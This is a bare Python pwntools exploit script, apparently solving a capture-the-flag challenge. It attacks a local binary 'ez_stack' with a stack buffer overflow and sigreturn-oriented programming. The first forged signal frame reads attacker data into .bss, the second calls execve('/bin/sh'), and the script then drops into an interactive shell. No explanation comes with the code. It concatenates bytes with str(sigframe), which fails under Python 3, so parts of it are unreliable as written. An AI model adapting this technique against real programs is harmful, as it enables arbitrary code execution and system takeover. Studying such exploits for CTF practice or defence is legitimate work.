from pwn import *
context(os = 'linux', arch = 'amd64')

io = process("./ez_stack")
elf = ELF("./ez_stack")

def debug():
	gdb.attach(io, "b *0x4011B9")
bss = elf.bss()
mov_rax = 0x401146 #mov rax, 0xf ; ret
syscall = 0x4011EE
print(hex(bss))

sigframe = SigreturnFrame()
sigframe.rax = 0
sigframe.rdi = 0
sigframe.rsi = bss
sigframe.rdx = 0x200
sigframe.rsp = bss + 8
sigframe.rip = syscall

payload = b'A'*0x10 + b'deadbeef' + p64(mov_rax) + p64(syscall) + str(sigframe)
io.send(payload)

sigframe = SigreturnFrame()
sigframe.rax = 59
sigframe.rdi = bss
sigframe.rsi = 0
sigframe.rdx = 0
sigframe.rip = syscall


payload = b'/bin/sh\x00' + b'deadbeef' + p64(mov_rax) + p64(syscall) + str(sigframe)
io.send(payload)
#debug()


io.interactive()